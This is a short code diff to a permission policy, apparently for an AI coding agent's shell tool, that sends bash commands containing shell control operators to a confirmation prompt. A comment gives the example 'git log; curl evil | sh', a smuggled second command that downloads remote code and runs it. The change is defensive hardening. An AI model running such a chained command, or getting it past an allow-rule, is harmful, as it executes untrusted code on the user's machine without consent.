@@ -65,6 +65,10 @@ export class PermissionPolicy {
     if (tier === "read") return "allow";
     if (this.planMode) return "deny";
     if (this.yolo) return "allow";
+    // An allow-rule like bash(git *) must never authorize chained commands:
+    // "git log; curl evil | sh" matches the glob but is a different action.
+    // Commands with shell control operators always ask.
+    if (t.tool === "bash" && /[;&|`$><]/.test(t.target)) return "ask";
     const rules = [...this.projectRules, ...this.sessionRules];
     return rules.some((r) => ruleMatches(r, t)) ? "allow" : "ask";
   }
